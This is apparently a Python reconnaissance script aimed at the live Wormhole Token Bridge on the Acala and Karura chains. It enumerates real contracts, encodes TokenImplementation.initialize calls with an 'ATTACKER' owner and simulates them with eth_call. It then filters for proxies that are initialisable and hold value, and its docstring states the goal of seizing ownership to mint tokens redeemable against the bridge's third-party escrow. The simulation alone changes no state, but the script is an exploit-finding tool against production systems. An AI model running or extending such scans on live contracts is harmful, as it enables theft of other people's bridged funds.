#!/usr/bin/env python3
"""FALLBACK: measure the LIVE Wormhole Token Bridge on Acala/Karura.

The live 21,967-byte bytecode (sha256 0x027f00ef... Acala / 0x1aec779d...
Karura) is wormhole-foundation/wormhole BridgeImplementation: its dispatcher
matches isInitialized(address)=0xd60b347f, tokenImplementation()=0x2f3a3d5d,
isWrappedAsset(address)=0x1a2be4da, wrappedAsset(uint16,bytes32)=0x1ff1e286,
governanceContract()=0xb172b222, WETH()=0xad5c4648, implementation()=0x5c60da1b.

Critical lead to kill/confirm: TokenImplementation.initialize(...) is
`initializer public` and sets `_state.owner`; a BeaconProxy deployed without
initialisation data lets ANY caller set itself owner and then mint() arbitrary
wrapped tokens, redeemable against the bridge's third-party escrow. This script
enumerates small proxy contracts, reads owner()/totalSupply(), and simulates
initialize(...) with eth_call (no state change) to find an initialisable one.
"""
import json, sys, os, datetime, traceback
import urllib.request

CHAINS = {
    'acala': ('https://acala-rpc.aca-api.network', 'https://eth-rpc-acala.aca-api.network', 10, 12, 787),
    'karura': ('https://karura-rpc.aca-api.network', 'https://eth-rpc-karura.aca-api.network', 8, 11, 686),
}
ATTACKER = '0x000000000000000000000000000000000000dEaD'
ZERO = '0x' + '0' * 40
BRIDGE_GETTERS = {
    'chainId': '0x9a8a0592', 'evmChainId': '0x64d42b17', 'paused': '0x5c975abb',
    'implementation': '0x5c60da1b', 'tokenImplementation': '0x2f3a3d5d',
    'governanceChainId': '0xfbe3c2cd', 'governanceContract': '0xb172b222',
    'WETH': '0xad5c4648',
}
PROXY_GETTERS = {'owner': '0x8da5cb5b', 'totalSupply': '0x18160ddd',
                 'name': '0x06fdde03', 'symbol': '0x95d89b41',
                 'implementation': '0x5c60da1b'}
# EIP-1967 implementation slot
IMPL_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'

def rpc(url, method, params, timeout=12):
    req = urllib.request.Request(url, data=json.dumps({
        'jsonrpc': '2.0', 'id': 1, 'method': method, 'params': params}).encode(),
        headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, timeout=timeout) as r: return json.load(r)

def call(url, to, data, frm=None):
    tx = {'to': to, 'data': data}
    if frm: tx['from'] = frm
    try:
        r = rpc(url, 'eth_call', [tx, 'latest'])
        if 'error' in r: return 'ERR:' + str(r['error'])[:160]
        return r.get('result')
    except Exception as e: return 'ERR:' + str(e)

def ok(v): return isinstance(v, str) and v.startswith('0x') and not v.startswith('ERR')

def u256(v):
    return int(v, 16) if ok(v) and len(v) >= 66 else 0

def addr(v):
    if not ok(v) or len(v) < 66: return None
    return '0x' + v[-40:]

def word(v): return v.lower().replace('0x', '').rjust(64, '0')

def encode_token_initialize(name, symbol, decimals, sequence, owner, chainid, native):
    """TokenImplementation.initialize(string,string,uint8,uint64,address,uint16,bytes32)
       selector 0xc71f4615; dynamic name/symbol at 0xe0 and 0xe0+len(name-data)."""
    nb = name.encode().hex(); sb = symbol.encode().hex()
    nd = word(hex(len(name))) + nb.ljust((len(nb) + 63) // 64 * 64, '0')
    off_sym = 0xe0 + len(nd) // 2
    sd = word(hex(len(symbol))) + sb.ljust((len(sb) + 63) // 64 * 64, '0')
    head = [word(hex(0xe0)), word(hex(off_sym)), word(hex(decimals)),
            word(hex(sequence)), word(owner), word(hex(chainid)), word(native)]
    return '0xc71f4615' + ''.join(head) + nd + sd

def j(x):
    if hasattr(x, 'value') and not isinstance(x, (dict, list, str, int, float, bytes)):
        try: return j(x.value)
        except Exception: return str(x)[:200]
    if isinstance(x, bytes): return '0x' + x.hex()
    if isinstance(x, dict): return {str(k): j(v) for k, v in x.items()}
    if isinstance(x, (list, tuple)): return [j(v) for v in x]
    if isinstance(x, (str, int, float, bool)) or x is None: return x
    return str(x)[:200]

def main(chain, out):
    from substrateinterface import SubstrateInterface
    srpc, erpc, ss58, worm_chain, evm_chain = CHAINS[chain]
    sub = SubstrateInterface(url=srpc, ss58_format=ss58)
    fin = rpc(srpc, 'chain_getFinalizedHead', [])['result']
    hdr = rpc(srpc, 'chain_getHeader', [fin])['result']
    sub.init_runtime(block_hash=fin)
    res = {'chain': chain, 'generated_at_utc': datetime.datetime.now(datetime.timezone.utc).isoformat(),
           'finalized_hash': fin, 'block_number': int(hdr['number'], 16),
           'rpc': srpc, 'evm_rpc': erpc, 'expected_wormhole_chain_id': worm_chain,
           'expected_evm_chain_id': evm_chain,
           'source_repo': 'wormhole-foundation/wormhole',
           'source_commit': '4725d90675b78c6881be0320a09f41aadb7c5e91',
           'errors': [], 'accounts': [], 'bridge_getters': {}, 'small_proxies': []}

    accounts = []
    try:
        rows = sub.query_map('EVM', 'Accounts', block_hash=fin, max_results=20000, page_size=200)
        for k, v in rows:
            a = j(k); info = j(v)
            if not isinstance(a, str) or not a.startswith('0x'): continue
            ci = info.get('contract_info') if isinstance(info, dict) else None
            if isinstance(ci, dict): accounts.append((a, ci))
    except Exception as e:
        res['errors'].append({'where': 'EVM.Accounts', 'error': str(e),
                              'trace': traceback.format_exc()[-1000:]})
    res['evm_contract_accounts_scanned'] = len(accounts)
    print('EVM contract accounts', len(accounts), flush=True)

    # read bridge getters on every account: only the bridge/proxy answers them
    for a, ci in accounts:
        g = {}
        for n, sel in BRIDGE_GETTERS.items():
            v = call(erpc, a, sel)
            if ok(v): g[n] = v
        if 'chainId' in g and len(g) >= 4:
            res['accounts'].append({'address': a, 'code_hash': ci.get('code_hash'), 'getters': g})
    print('bridge-like accounts', len(res['accounts']), flush=True)
    for a in res['accounts'][:6]:
        res['bridge_getters'][a['address']] = {
            k: (int(v, 16) if len(v) == 66 else v) for k, v in a['getters'].items()}

    # small proxies = candidates for Wormhole BeaconProxy / UUPS / Safe proxies
    small = []
    for a, ci in accounts:
        try:
            r = rpc(erpc, 'eth_getCode', [a, 'latest'])
            code = r.get('result', '0x')
        except Exception: code = '0x'
        if 2 < len(code) <= 2 + 2 * 600:  # <= 600 bytes
            small.append((a, len(code) // 2 - 1, code))
    res['small_proxy_count'] = len(small)
    print('small contracts (<=600B)', len(small), flush=True)

    for a, nbytes, code in small[:400]:
        rec = {'address': a, 'code_bytes': nbytes}
        for n, sel in PROXY_GETTERS.items():
            rec[n] = call(erpc, a, sel)
        rec['owner_addr'] = addr(rec['owner'])
        rec['supply'] = u256(rec['totalSupply'])
        try:
            s = rpc(erpc, 'eth_getStorageAt', [a, IMPL_SLOT, 'latest']).get('result')
            rec['eip1967_impl'] = addr(s)
        except Exception: rec['eip1967_impl'] = None
        try:
            rec['native_balance_wei'] = int(rpc(erpc, 'eth_getBalance', [a, 'latest'])['result'], 16)
        except Exception: rec['native_balance_wei'] = 0
        # simulate permissionless TokenImplementation.initialize(...)
        data = encode_token_initialize('A', 'B', 18, 1, ATTACKER, worm_chain, '0x' + '11' * 32)
        rec['token_initialize_eth_call'] = call(erpc, a, data, ATTACKER)
        rec['initialisable'] = ok(rec['token_initialize_eth_call'])
        # also UUPS initialize() and Uniswap initialize(address,address)
        rec['uups_initialize_eth_call'] = call(erpc, a, '0x8129fc1c', ATTACKER)
        rec['uups_initialisable'] = ok(rec['uups_initialize_eth_call'])
        rec['has_value'] = bool(rec['native_balance_wei']) or bool(rec['supply'])
        res['small_proxies'].append(rec)
    res['initialisable_with_value'] = [
        p['address'] for p in res['small_proxies'] if p['initialisable'] and p['has_value']]
    res['uups_initialisable_with_value'] = [
        p['address'] for p in res['small_proxies'] if p['uups_initialisable'] and p['has_value']]
    os.makedirs(os.path.dirname(out) or '.', exist_ok=True)
    with open(out, 'w') as f: json.dump(res, f, indent=1, default=str)
    print('wrote', out, '| INITIALISABLE_WITH_VALUE', res['initialisable_with_value'],
          '| UUPS_WITH_VALUE', res['uups_initialisable_with_value'], flush=True)
    for p in res['small_proxies'][:14]:
        print(' ', p['address'], 'code', p['code_bytes'], 'owner', p['owner_addr'],
              'supply', p['supply'], 'wei', p['native_balance_wei'],
              'init', str(p['token_initialize_eth_call'])[:46], flush=True)

if __name__ == '__main__':
    main(sys.argv[1] if len(sys.argv) > 1 else 'acala',
         sys.argv[2] if len(sys.argv) > 2 else 'audit-live/wormhole-bridge-acala.json')
